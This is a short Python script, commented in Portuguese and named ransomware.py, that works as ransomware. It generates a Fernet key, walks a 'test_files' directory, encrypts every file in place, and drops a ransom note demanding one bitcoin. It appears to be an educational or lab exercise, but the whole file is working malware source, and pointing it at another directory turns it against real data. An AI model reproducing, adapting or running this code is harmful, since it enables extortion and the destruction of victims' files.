from cryptography.fernet import Fernet
import os

#Gerar chave e salvar
def gerar_chave():
    chave = Fernet.generate_key() 
    with open ("chave.key", "wb") as chave_files:
        chave_files.write(chave)

#Carregar chave e salvar
def carregar_chave():
    return open("chave.key","rb").read()

#Criptografar um unico file
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#Encontrar arquivos para encriptar
def encontrar_arquivo(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#Mensagem resgate
def crate_message_resgate():
    with open ("LEIA ISSO.txt", "w") as f:
        f.write ("Seus arquivos foram criptografados\n")
        f.write ("Envie 1 bitcoin para o endereço X e envie o comprovante!")
        f.write ("Depois disso enviaremos a chave para voce recuperar seus dados")

#Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivo("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    crate_message_resgate()
    print("Ransoware executado com sucesso")

if __name__ == "__main__":
    main()